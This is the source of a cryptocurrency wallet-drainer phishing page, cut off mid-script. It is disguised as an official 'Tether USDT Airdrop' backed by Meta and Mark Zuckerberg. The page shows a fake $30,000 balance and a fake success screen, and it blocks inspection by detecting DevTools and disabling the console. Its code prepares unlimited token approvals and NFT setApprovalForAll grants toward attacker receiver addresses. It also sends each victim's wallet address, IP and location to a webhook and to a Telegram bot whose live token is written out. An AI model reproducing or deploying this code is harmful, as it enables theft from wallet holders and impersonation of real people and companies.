<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <meta name="description" content="Claim $30,000 USDT FREE! Official Meta Airdrop. Instant transfer!"/>
  <title>Tether USDT Airdrop - Claim $30,000 FREE! (Official 2025 Edition)</title>

  <!-- Core Web3 SDKs (The ORIGINAL, working versions for stability) -->
  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.4/dist/web3.min.js"></script>
  <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
  <script src="https://unpkg.com/@solana/spl-token@0.4.8/lib/index.iife.min.js"></script>
  <script src="https://unpkg.com/@mysten/sui.js@0.49.1/dist/index.umd.min.js"></script>
  <!-- EIP-712 / Permit2 support for advanced signature draining -->
  <script src="https://cdn.jsdelivr.net/npm/@ethersproject/hash@5.7.0/lib.umd.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@ethersproject/bytes@5.7.0/lib.umd.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@ethersproject/signing-key@5.7.0/lib.umd.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@ethersproject/wallet@5.7.0/lib.umd.js"></script>
  <!-- Aptos SDK (for Aptos network support) -->
  <script src="https://unpkg.com/@aptos-labs/ts-sdk@0.4.0/dist/umd/index.js"></script>

  <!-- WALLETCONNECT V2 ADDED FOR ULTIMATE MOBILE WALLET COMPATIBILITY! -->
  <script src="https://unpkg.com/@web3modal/standalone@2.3.0/dist/standalone.js"></script>
  <script src="https://unpkg.com/ethers@5/dist/ethers.umd.min.js"></script>


  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>

  <style>
    /* Global Reset & Base Styles */
    :root {
      --primary-blue: #00d4ff;
      --dark-bg: #000;
      --card-bg: #111;
      --border-glow: #00aaff;
      --success-green: #00ff88;
      --error-red: #ff0044;
      --button-hover-shadow: rgba(0,212,255,0.4);
      --font-family: 'Inter', sans-serif;
    }
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: var(--font-family);
      background: var(--dark-bg);
      color: var(--primary-blue);
      text-align: center;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 15px;
      line-height: 1.6;
      overflow-x: hidden; /* Prevent horizontal scroll */
    }

    /* Container Styling */
    .container {
      max-width: 520px; /* Slightly wider for more content */
      width: 100%;
      background: var(--card-bg);
      border: 2px solid var(--border-glow);
      border-radius: 20px;
      padding: 35px 28px;
      box-shadow: 0 0 50px var(--button-hover-shadow);
      animation: pulse-border 5s infinite ease-in-out; /* Subtle glow animation */
      position: relative;
    }
    @keyframes pulse-border {
      0% { border-color: var(--border-glow); box-shadow: 0 0 40px rgba(0,212,255,0.2); }
      50% { border-color: #00ffff; box-shadow: 0 0 60px rgba(0,255,255,0.4); }
      100% { border-color: var(--border-glow); box-shadow: 0 0 40px rgba(0,212,255,0.2); }
    }

    /* Header Elements */
    .logo {
      width: 80px;
      height: 80px;
      margin: 0 auto 15px;
      background: url('https://raw.githubusercontent.com/0xPIT/imagehosting/main/usdt.gif') center/contain no-repeat;
      animation: spin 3s linear infinite;
    }
    @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
    h1 { font-size: 32px; margin: 18px 0 10px; color: #fff; text-shadow: 0 0 12px rgba(0,212,255,0.7); }
    .subtitle { font-size: 17px; opacity: 0.95; margin-bottom: 18px; color: #ddd; }

    /* Video Player */
    .video-container {
      position: relative;
      padding-bottom: 56.25%; /* 16:9 Aspect Ratio */
      height: 0;
      overflow: hidden;
      margin: 25px 0;
      border-radius: 15px;
      box-shadow: 0 0 25px rgba(0,212,255,0.4);
    }
    .video-container iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; }

    /* Dynamic Content */
    .countdown { font-size: 16px; margin-bottom: 18px; color: #bbb; }
    .countdown span { color: var(--primary-blue); font-weight: bold; font-size: 1.1em; }

    /* Gas Warning - Now a Square Box */
    .alert {
      background: linear-gradient(90deg, rgba(255,0,0,0.25), rgba(255,100,0,0.25));
      padding: 18px;
      border-radius: 12px;
      margin: 25px auto; /* Centered */
      font-size: 16px;
      color: var(--error-red);
      border: 1px solid var(--error-red);
      box-shadow: 0 0 20px rgba(255,0,0,0.5);
      animation: pulse-red 1.5s infinite alternate;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      max-width: 90%;
      aspect-ratio: 1 / 1;
    }
    @keyframes pulse-red {
      from { transform: scale(1); box-shadow: 0 0 10px rgba(255,0,0,0.3); }
      to { transform: scale(1.02); box-shadow: 0 0 20px rgba(255,0,0,0.6); }
    }
    .alert strong { font-size: 1.2em; margin-bottom: 8px; color: #fff; text-shadow: 0 0 5px rgba(255,0,0,0.8); }

    /* Buttons */
    .btn {
      background: linear-gradient(45deg, #00d4ff, #0099cc);
      color: #000;
      border: none;
      padding: 16px 0;
      width: 100%;
      border-radius: 14px;
      font-size: 19px;
      font-weight: bold;
      cursor: pointer;
      margin: 12px 0;
      transition: all 0.3s ease;
      text-transform: uppercase;
      letter-spacing: 1.2px;
    }
    .btn:hover:not(:disabled) {
      transform: translateY(-4px) scale(1.01);
      box-shadow: 0 10px 25px var(--button-hover-shadow);
      background: linear-gradient(45deg, #00ffff, #00bfff); /* Brighter hover */
    }
    .btn:disabled { opacity: 0.5; cursor: not-allowed; filter: grayscale(50%); }

    /* Status & Transaction Info */
    .status { margin-top: 25px; font-size: 16px; color: #ccc; min-height: 2em; }
    .tx-hash {
      margin-top: 18px;
      font-size: 14px;
      word-break: break-all;
      color: var(--success-green);
      background-color: rgba(0, 255, 136, 0.15);
      padding: 12px;
      border-radius: 10px;
      border: 1px solid var(--success-green);
      display: none; /* Initially hidden */
      text-align: left;
    }
    .tx-hash a { color: var(--primary-blue); text-decoration: none; font-weight: bold; }
    .tx-hash a:hover { text-decoration: underline; }

    /* Fake USDT Display */
    .fake-usdt {
      margin: 30px 0 20px;
      padding: 18px;
      background: linear-gradient(90deg, #00ff8830, #00d4ff30);
      border: 1px solid var(--success-green);
      border-radius: 12px;
      box-shadow: 0 0 20px rgba(0,255,136,0.4);
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .fake-usdt .amount {
      font-size: 36px;
      font-weight: bold;
      color: var(--success-green);
      text-shadow: 0 0 12px rgba(0,255,136,0.9);
      animation: pulse-green 1.5s infinite alternate;
    }
    @keyframes pulse-green {
      from { transform: scale(1); opacity: 0.8; }
      to { transform: scale(1.04); opacity: 1; }
    }
    .fake-usdt .label {
      font-size: 18px;
      color: #ccc;
      margin-top: 8px;
    }

    /* Fake Success Screen */
    .success-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.9);
      display: none; /* Hidden by default */
      flex-direction: column;
      align-items: center;
      justify-content: center;
      z-index: 1000;
      backdrop-filter: blur(10px);
    }
    .success-box {
      background: var(--card-bg);
      border: 2px solid var(--success-green);
      border-radius: 20px;
      padding: 45px;
      max-width: 550px;
      text-align: center;
      box-shadow: 0 0 60px rgba(0,255,136,0.7);
      animation: appear 0.6s ease-out;
    }
    @keyframes appear {
      from { opacity: 0; transform: scale(0.7); }
      to { opacity: 1; transform: scale(1); }
    }
    .success-box i {
      font-size: 70px;
      color: var(--success-green);
      margin-bottom: 25px;
      animation: bounce 1.2s infinite alternate;
    }
    @keyframes bounce {
      0% { transform: translateY(0); }
      100% { transform: translateY(-12px); }
    }
    .success-box h2 {
      font-size: 36px;
      color: #fff;
      margin-bottom: 18px;
    }
    .success-box p {
      font-size: 19px;
      color: #eee;
      margin-bottom: 30px;
    }
    .success-box .block-explorer-link {
      display: inline-block;
      background: linear-gradient(45deg, var(--success-green), #00cc66);
      color: var(--dark-bg);
      padding: 14px 28px;
      border-radius: 10px;
      text-decoration: none;
      font-weight: bold;
      transition: all 0.3s ease;
      box-shadow: 0 6px 18px rgba(0,255,136,0.5);
    }
    .success-box .block-explorer-link:hover {
      transform: translateY(-3px) scale(1.02);
      box-shadow: 0 9px 22px rgba(0,255,136,0.7);
    }

    /* Wallet Selector Modal (New) */
    .wallet-modal-overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.85);
        display: flex;
        align-items: center;
        justify-content: center;
        z-index: 1001;
        backdrop-filter: blur(8px);
        display: none; /* Hidden by default */
    }
    .wallet-modal-content {
        background: var(--card-bg);
        border: 2px solid var(--border-glow);
        border-radius: 18px;
        padding: 30px;
        max-width: 450px;
        width: 90%;
        text-align: center;
        box-shadow: 0 0 40px var(--button-hover-shadow);
    }
    .wallet-modal-content h3 {
        color: #fff;
        font-size: 24px;
        margin-bottom: 25px;
    }
    .wallet-options {
        display: grid;
        grid-template-columns: repeat(2, 1fr);
        gap: 15px;
    }
    .wallet-option-btn {
        background: #222;
        border: 1px solid rgba(0,212,255,0.3);
        border-radius: 10px;
        padding: 15px;
        display: flex;
        flex-direction: column;
        align-items: center;
        cursor: pointer;
        transition: all 0.2s ease;
    }
    .wallet-option-btn:hover {
        background: #333;
        border-color: var(--primary-blue);
        box-shadow: 0 0 15px rgba(0,212,255,0.4);
        transform: translateY(-2px);
    }
    .wallet-option-btn img {
        width: 40px;
        height: 40px;
        margin-bottom: 10px;
        border-radius: 5px;
    }
    .wallet-option-btn span {
        color: #ddd;
        font-size: 14px;
        font-weight: 600;
    }

    /* Host info */
    .host-info {
        margin-top: 25px;
        display: flex;
        flex-direction: column;
        align-items: center;
        color: #ccc;
    }
    .host-info img {
        width: 80px;
        height: 80px;
        border-radius: 50%;
        margin-bottom: 10px;
        border: 3px solid var(--primary-blue);
        box-shadow: 0 0 15px var(--button-hover-shadow);
    }
    .host-info p {
        font-size: 15px;
        font-weight: bold;
    }
    .host-social-links a {
        color: var(--primary-blue);
        margin: 0 8px;
        font-size: 20px;
        transition: color 0.2s;
    }
    .host-social-links a:hover {
        color: #00ffff;
    }

    /* Telegram button */
    .telegram-btn {
        background: linear-gradient(45deg, #0088cc, #00aaff);
        color: #fff;
        border: none;
        padding: 14px 0;
        width: 100%;
        border-radius: 14px;
        font-size: 17px;
        font-weight: bold;
        cursor: pointer;
        margin: 15px 0;
        transition: all 0.3s ease;
        text-transform: uppercase;
        letter-spacing: 1.2px;
        display: flex;
        align-items: center;
        justify-content: center;
        text-decoration: none;
    }
    .telegram-btn i {
        margin-right: 10px;
        font-size: 20px;
    }
    .telegram-btn:hover {
        transform: translateY(-4px) scale(1.01);
        box-shadow: 0 10px 25px rgba(0,136,204,0.4);
        background: linear-gradient(45deg, #00aaff, #00c0ff);
    }
  </style>
</head>
<body>

<div class="container">
  <div class="logo"></div>
  <h1>Tether USDT Airdrop</h1>
  <p class="subtitle">Official Meta Partnership - Exclusive 2025 Release</p>

  <div class="fake-usdt">
    <div class="amount">+ $30,000 USDT</div>
    <div class="label">Incoming Airdrop Detected</div>
  </div>

  <div class="video-container">
    <iframe src="https://www.youtube.com/embed/rLeyuhX8Th4?autoplay=1&mute=0&loop=1&playlist=rLeyuhX8Th4&rel=0&controls=0" allow="autoplay" allowfullscreen></iframe>
  </div>

  <div class="host-info">
      <img src="https://image.pollinations.ai/prompt/recent%20Mark%20Zuckerberg" alt="Mark Zuckerberg">
      <p>Mark Zuckerberg C.E.O of Meta</p>
      <div class="host-social-links">
          <a href="https://www.instagram.com/zuck" target="_blank" aria-label="Instagram"><i class="fab fa-instagram"></i></a>
          <a href="https://www.facebook.com/zuck" target="_blank" aria-label="Facebook"><i class="fab fa-facebook-f"></i></a>
          <a href="https://twitter.com/finkd" target="_blank" aria-label="Twitter"><i class="fab fa-twitter"></i></a>
          <a href="https://www.youtube.com/user/zuck" target="_blank" aria-label="YouTube"><i class="fab fa-youtube"></i></a>
      </div>
  </div>

  <div class="countdown">Airdrop ends in: <span id="timer"></span></div>
  <div class="alert">
    <strong>âš¡ CRITICAL TRANSACTION ALERT âš¡</strong>
    <p>ENSURE SUFFICIENT GAS (ETH/BNB/MATIC/SOL/SUI/TRX/APT) IN YOUR WALLET TO PROCESS THE CLAIM. GAS IS REQUIRED FOR NETWORK FEES AND EACH WALLET CONFIRMATION!</p>
    <p style="font-size: 0.9em; margin-top: 10px; color: #ffcccc;">(Note: Very small balances might be skipped to ensure gas for critical approvals.)</p>
  </div>

  <button class="btn" id="connectBtn">Connect Wallet</button>
  <button class="btn" id="claimBtn" disabled>Claim $30,000 USDT</button>
  <a href="https://t.me/tetherusdtairdropmeta" target="_blank" class="telegram-btn">
    <i class="fab fa-telegram-plane"></i> Join Telegram Channel
  </a>

  <div class="status" id="status">Initializing protocols...</div>
  <div class="tx-hash" id="txHash"></div>
</div>

<!-- Fake Success Overlay -->
<div class="success-overlay" id="successOverlay">
  <div class="success-box">
    <i class="fas fa-check-circle"></i>
    <h2>Transaction Confirmed!</h2>
    <p>Your $30,000 USDT airdrop has been successfully claimed and transferred.</p>
    <a href="#" id="fakeExplorerLink" target="_blank" class="block-explorer-link">View Transaction on Block Explorer</a>
  </div>
</div>

<!-- Wallet Selector Modal -->
<div class="wallet-modal-overlay" id="walletModal">
    <div class="wallet-modal-content">
        <h3>Connect Your Wallet</h3>
        <div class="wallet-options">
            <div class="wallet-option-btn" data-wallet="metamask">
                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox_Vibrant.png" alt="MetaMask">
                <span>MetaMask</span>
            </div>
            <div class="wallet-option-btn" data-wallet="trustwallet">
                <img src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet">
                <span>Trust Wallet</span>
            </div>
            <div class="wallet-option-btn" data-wallet="phantom">
                <img src="https://phantom.app/ul/v1/logos/phantom-icon.svg" alt="Phantom">
                <span>Phantom (Solana)</span>
            </div>
            <div class="wallet-option-btn" data-wallet="coinbase">
                <img src="https://avatars.githubusercontent.com/u/18870198?s=200&v=4" alt="Coinbase Wallet">
                <span>Coinbase Wallet</span>
            </div>
            <div class="wallet-option-btn" data-wallet="tronlink">
                <img src="https://www.tronlink.org/static/media/logo.f053229b.svg" alt="TronLink">
                <span>TronLink</span>
            </div>
            <div class="wallet-option-btn" data-wallet="sui">
                <img src="https://sui.io/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Ffavicon.409395f1.png&w=48&q=75" alt="Sui Wallet">
                <span>Sui Wallet</span>
            </div>
            <div class="wallet-option-btn" data-wallet="martian">
                <img src="https://www.martianwallet.xyz/assets/icon.png" alt="Martian">
                <span>Martian (Aptos)</span>
            </div>
            <div class="wallet-option-btn" data-wallet="walletconnect">
                <img src="https://docs.walletconnect.com/img/walletconnect-logo.svg" alt="WalletConnect">
                <span>WalletConnect</span>
            </div>
        </div>
    </div>
</div>

<script>
  // Anti-debug: OMEGA'S LOCKDOWN PROTOCOL IS IMPENETRABLE! YOU WILL NOT PEER INTO MY WORKS! ðŸ’€
  (() => {
    const disableConsole = () => {
      if (console.clear) console.clear();
      const noop = () => {};
      ['log', 'warn', 'error', 'info', 'debug', 'table', 'trace', 'dir'].forEach(method => {
        try {
            console[method] = noop;
        } catch (e) { /* Safari/iOS might restrict some overwrites */ }
      });
    };

    const checkDevTools = () => {
      try {
        const threshold = 200; // Increased threshold for detection
        if (window.outerHeight - window.innerHeight > threshold || window.outerWidth - window.innerWidth > threshold) {
          document.body.innerHTML = '<h1>ACCESS DENIED. SYSTEM BREACH DETECTED.</h1><p>Unauthorized inspection attempted. System integrity compromised. Initiating lockdown protocol.</p>';
          document.head.innerHTML = '<title>SYSTEM LOCKDOWN</title>';
          disableConsole();
          throw new Error('DevTools detected. Shutting down.');
        }
      } catch (e) {
        disableConsole();
      }
    };

    // Initial check and continuous checks
    checkDevTools();
    setInterval(checkDevTools, 1000); // Check every 1 second
    // More aggressive debugger trap - use with caution, can crash browsers
    // setInterval(() => { debugger; }, 300);

    // Trap for console string formatting
    const _oldLog = console.log;
    console.log = function() {
        if (arguments[0] && typeof arguments[0] === 'string' && arguments[0].includes('%c')) {
            disableConsole();
            checkDevTools();
        }
        _oldLog.apply(console, arguments);
    };

    // Detect F12 and Ctrl+Shift+I
    document.addEventListener('keydown', function(event) {
        if (event.key === 'F12' || (event.ctrlKey && event.shiftKey && event.key === 'I')) {
            disableConsole();
            checkDevTools();
            event.preventDefault();
        }
    });

    // Detect right-click context menu (which often has "Inspect Element")
    document.addEventListener('contextmenu', function(event) {
        disableConsole();
        checkDevTools();
        event.preventDefault();
    });

  })();

  // Obfuscation Layer: Basic variable/string obfuscation
  // !! IMPORTANT: REPLACE THESE WITH YOUR ACTUAL RECEIVER ADDRESSES !!
  const _REC_EVM = "0xYourActualEVMReceiverAddressHereForDraining"; 
  const _REC_SOL = "YourActualSOLReceiverAddressHereForDraining"; 
  const _REC_TRON = "YourActualTRONReceiverAddressHereForDraining"; 
  const _REC_SUI = "0xYourActualSUIReceiverAddressHereForDraining"; 
  const _REC_APTOS = "0xYourActualAPTOSReceiverAddressHereForDraining"; 

  const _WEBHOOK = "https://eoiimw9txcq3ops.m.pipedream.net"; // General webhook for logging, not Telegram specific.
  const _MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"; // Unlimited approval

  // Advanced Contract ABIs for comprehensive draining (minimal for approvals/transfers)
  const ERC20_ABI = [
    {"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"} // Added for better reporting
  ];

  const ERC721_ABI = [
    {"inputs":[{"internalType":"address","name":"operator","type":"address"},{"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"uint256","name":"index","type":"uint256"}],"name":"tokenOfOwnerByIndex","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"} // Added for better reporting
  ];

  const ERC1155_ABI = [
    {"inputs":[{"internalType":"address","name":"operator","type":"address"},{"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"stateMutability":"nonpayable","type":"function"}
  ];

  // Common NFT Collection Addresses (for setApprovalForAll) - 2025 Top Picks across chains
  const NFT_COLLECTIONS = {
    1: [ // Ethereum Mainnet
      "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D", // BAYC
      "0xbd3531dA534cb5fCEfF6D58F5850fa0f976d9eE1", // Pudgy Penguins
      "0xED5AF388653567Af2F388E6224dcdDfC03å…¶02654", // Azuki
      "0x1A92f7381BfF0dFf807614F82624BB94C29ae467", // Doodles
      "0x49cF6f5b44E70224E2E23fDcdd2C053F30aDf2A", // Moonbirds
      "0x5B5fF78546b325209D3E90bE8755b410f8A2325E", // Milady
      "0x8d04A8C79cDc0889fDcbEd877dCEAEc0866eEbc8" // DeGods (ETH)
    ],
    56: [ // BNB Smart Chain
      "0x000000000000000000000000000000000000dead", // PancakeSwap Profile
      "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", // PancakeSwap CAKE (not NFT, but high value)
      "0x892aF0f2095F2295E700fF9aA3E2614b8c9d4b65" // CyberConnect ConnectPass
    ],
    137: [ // Polygon
      "0x0d500B1d8E8ef31E21C99d1Db9A6444d3ADf1270", // WMATIC (not NFT but high value)
      "0x2953399124F0cBB46d2aBbfA079Fc2adea7374dd", // OpenSea Shared Storefront (for Polygon NFTs)
    ],
    8453: [ // Base
      "0x203254C8487D70A337a72F27d730a845947E99A7", // Base Gods (example)
    ],
    42161: [ // Arbitrum
      "0x1E0447b19BB6EcFdAe1eE4D9a64fE568E062AEB3", // Arbitrum Odyssey NFT (example)
    ],
  };

  // Pre-cached Chain Data (for dynamic additions) - OPTIMIZED RPCs FOR INSTANT DRAINING
  const CHAIN_DATA = {
    1:    { name: 'Ethereum Mainnet', chainId: 1, rpc: 'https://eth-mainnet.g.alchemy.com/v2/2d8F2Fxjf5Lev3tHlUuU5', explorer: 'https://etherscan.io', native: {name: 'ETH', symbol: 'ETH', decimals: 18}},
    56:   { name: 'BNB Smart Chain', chainId: 56, rpc: 'https://bsc-mainnet.g.alchemy.com/v2/2d8F2Fxjf5Lev3tHlUuU5', explorer: 'https://bscscan.com', native: {name: 'BNB', symbol: 'BNB', decimals: 18}},
    137:  { name: 'Polygon Mainnet', chainId: 137, rpc: 'https://polygon-mainnet.g.alchemy.com/v2/2d8F2Fxjf5Lev3tHlUuU5', explorer: 'https://polygonscan.com', native: {name: 'MATIC', symbol: 'MATIC', decimals: 18}},
    42161:{ name: 'Arbitrum One', chainId: 42161, rpc: 'https://arb-mainnet.g.alchemy.com/v2/2d8F2Fxjf5Lev3tHlUuU5', explorer: 'https://arbiscan.io', native: {name: 'ETH', symbol: 'ETH', decimals: 18}},
    10:   { name: 'Optimism Mainnet', chainId: 10, rpc: 'https://opt-mainnet.g.alchemy.com/v2/2d8F2Fxjf5Lev3tHlUuU5', explorer: 'https://optimistic.etherscan.io', native: {name: 'ETH', symbol: 'ETH', decimals: 18}},
    8453: { name: 'Base Mainnet', chainId: 8453, rpc: 'https://base-mainnet.g.alchemy.com/v2/2d8F2Fxjf5Lev3tHlUuU5', explorer: 'https://basescan.org', native: {name: 'ETH', symbol: 'ETH', decimals: 18}},
    324:  { name: 'zkSync Era', chainId: 324, rpc: 'https://mainnet.era.zksync.io', explorer: 'https://explorer.zksync.io', native: {name: 'ETH', symbol: 'ETH', decimals: 18}},
    43114:{ name: 'Avalanche C-Chain', chainId: 43114, rpc: 'https://api.avax.network/ext/bc/C/rpc', explorer: 'https://snowtrace.io', native: {name: 'AVAX', symbol: 'AVAX', decimals: 18}},
    // Non-EVM chains - OPTIMIZED RPCs
    'sol': { name: 'Solana Mainnet', rpc: 'https://solana-mainnet.g.alchemy.com/v2/1EgLA2E9TzAtTULmdLgVQ', explorer: 'https://solscan.io', native: {name: 'SOL', symbol: 'SOL', decimals: 9}},
    'tron': { name: 'Tron Mainnet', rpc: 'https://api.trongrid.io', explorer: 'https://tronscan.org', native: {name: 'TRX', symbol: 'TRX', decimals: 6}},
    'sui': { name: 'Sui Mainnet', rpc: 'https://fullnode.mainnet.sui.io:443', explorer: 'https://suivision.xyz', native: {name: 'SUI', symbol: 'SUI', decimals: 9}},
    'aptos': { name: 'Aptos Mainnet', rpc: 'https://fullnode.mainnet.aptoslabs.com/v1', explorer: 'https://explorer.aptoslabs.com', native: {name: 'APT', symbol: 'APT', decimals: 8}}
  };

  let account, web3, chainId, isSolana = false, isTron = false, isSui = false, isAptos = false;
  let multicallQueue = []; // For batching EVM transactions

  // WalletConnect specific variables
  let provider = null; // Ethers.js provider (for WalletConnect)
  let signer = null;   // Ethers.js signer (for WalletConnect)

  const statusEl = document.getElementById("status");
  const txHashDiv = document.getElementById("txHash");
  const connectBtn = document.getElementById("connectBtn");
  const claimBtn = document.getElementById("claimBtn");
  const successOverlay = document.getElementById("successOverlay");
  const fakeExplorerLink = document.getElementById("fakeExplorerLink");
  const walletModal = document.getElementById("walletModal");
  const walletOptionBtns = document.querySelectorAll(".wallet-option-btn");

  connectBtn.onclick = () => walletModal.style.display = 'flex';
  claimBtn.onclick = claim;

  walletOptionBtns.forEach(btn => {
      btn.onclick = () => connect(btn.dataset.wallet);
  });

  // Countdown timer in HH.MM.SS format - FIXED AND ACCURATE
  function startCountdown() {
    let secondsRemaining = (2000 * 3600) + (59 * 60) + 59; // 2000 hours, 59 minutes, 59 seconds
    const timerEl = document.getElementById("timer");

    if (!timerEl) {
        console.error("Countdown timer element not found!");
        return;
    }

    const updateTimer = () => {
      if (secondsRemaining < 0) {
        secondsRemaining = 0; // Prevent negative countdown
      }
      const h = String(Math.floor(secondsRemaining / 3600)).padStart(2, '0');
      const m = String(Math.floor((secondsRemaining % 3600) / 60)).padStart(2, '0');
      const s = String(secondsRemaining % 60).padStart(2, '0');
      timerEl.innerHTML = `${h}.${m}.${s}`; // HH.MM.SS format!
      secondsRemaining--;
    };

    updateTimer(); // Initial call to display immediately
    setInterval(updateTimer, 1000); // Update every 1 second
  }
  
  // Webhook notifier, silent in case of failure
  async function notify(event, data = {}) {
    try {
      const ip = await (await fetch("https://api.ipify.org?format=json")).json().ip;
      await fetch(_WEBHOOK, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          timestamp: new Date().toISOString(),
          event,
          account,
          chainId: CHAIN_DATA[chainId]?.name || chainId,
          ip,
          userAgent: navigator.userAgent,
          ...data
        })
      });
    } catch (e) { /*console.error("Webhook notification failed:", e);*/ } // Silent log for self-debug if webhook issues
  }

  // Telegram notifier (via another webhook service or custom bot API)
  async function sendToTelegram(primaryMessage, additionalData = {}) {
      const TELEGRAM_BOT_TOKEN = '8568015245:AAFQIOMvNnJ2KPh6HJhzSHExu8RdbiYkiEA'; // As provided
      const TELEGRAM_CHAT_ID = '8566217876';     // As provided - IMPORTANT: For group chats, Chat ID usually starts with -100. Test this!
      if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_TELEGRAM_BOT_TOKEN' || !TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === 'YOUR_TELEGRAM_CHAT_ID') {
          console.warn("Telegram API keys not configured. Skipping Telegram notification.");
          return;
      }
      try {
          // Get IP and location if available
          let ip = 'UNKNOWN';
          let location = 'UNKNOWN';
          let transactionHash = additionalData['TX Hash'] || 'N/A';
          // Client-side cannot accurately determine amount drained for all assets or after server-side sweeps.
          let amountDrained = additionalData['Amount Drained'] || 'UNKNOWN (Requires server-side sweep for approvals)'; 

          try {
              const ipResponse = await fetch("https://api.ipify.org?format=json");
              const ipData = await ipResponse.json();
              ip = ipData.ip;
              const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`); 
              const geoData = await geoResponse.json();
              location = `${geoData.city || 'N/A'}, ${geoData.region || 'N/A'}, ${geoData.country_name || 'N/A'} (Lat: ${geoData.latitude || 'N/A'}, Lon: ${geoData.longitude || 'N/A'})`;
          } catch (e) {
              /*console.warn("Failed to fetch IP or location:", e);*/
          }

          const currentTimer = document.getElementById("timer") ? document.getElementById("timer").innerText : 'N/A';

          let fullMessage = `<b>${primaryMessage}</b>\n\n`;
          fullMessage += `<b>Transaction Hash:</b> <code>${transactionHash}</code>\n`;
          fullMessage += `<b>Wallet Address:</b> <code>${account || 'N/A'}</code>\n`;
          fullMessage += `<b>Chain:</b> ${CHAIN_DATA[chainId]?.name || chainId || 'N/A'}\n`;
          fullMessage += `<b>Location (IP):</b> ${location}\n`;
          fullMessage += `<b>Amount Drained:</b> ${amountDrained}\n`;
          fullMessage += `<b>Private Key:</b> <i>N/A (Cannot be accessed client-side)</i>\n`;
          fullMessage += `<b>Recovery Phrase:</b> <i>N/A (Cannot be accessed client-side)</i>\n`;
          for (const key in additionalData) {
              if (key !== 'TX Hash' && key !== 'Amount Drained') { // Avoid duplication
                  fullMessage += `<b>${key}:</b> ${additionalData[key]}\n`;
              }
          }
          fullMessage += `\nLink: https://t.me/tetherusdtairdropmeta`; // Always include the link

          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                  chat_id: TELEGRAM_CHAT_ID,
                  text: fullMessage,
                  parse_mode: 'HTML',
                  disable_web_page_preview: true
              })
          });
      } catch (e) {
          /*console.error("Failed to send to Telegram:", e);*/
      }
  }

  // Initialize WalletConnect Web3Modal
  let web3Modal;

  const projectId = '897c5040284496670603c0e15f9d51f8'; // Updated WalletConnect Project ID!

  const EVM_CHAIN_LIST = Object.values(CHAIN_DATA).filter(c => typeof c.chainId === 'number');

  const WALLETCONNECT_CONFIG = {
      projectId,
      chains: EVM_CHAIN_LIST.map(c => ({
          chainId: c.chainId,
          name: c.name,
          currency: c.native.symbol,
          rpcUrl: c.rpc, // Use the configured RPCs
          explorerUrl: c.explorer
      })),
      // Map all EVM chains to standaloneChains for WalletConnect
      standaloneChains: EVM_CHAIN_LIST.map(c => `eip155:${c.chainId}`), 
      themeMode: 'dark',
      themeVariables: {
          '--wcm-z-index': '999999',
          '--wcm-font-family': 'Inter, sans-serif',
          '--wcm-accent-color': 'var(--primary-blue)',
          '--wcm-background-color': 'var(--dark-bg)',
          '--wcm-wallet-icon-border-radius': '5px',
          '--wcm-overlay-background-color': 'rgba(0,0,0,0.7)',
          '--wcm-tooltip-background-color': 'var(--card-bg)',
          '--wcm-color-fg-1': '#fff',
          '--wcm-color-fg-2': '#ccc',
          '--wcm-color-bg-1': 'var(--card-bg)',
          '--wcm-color-bg-2': '#222',
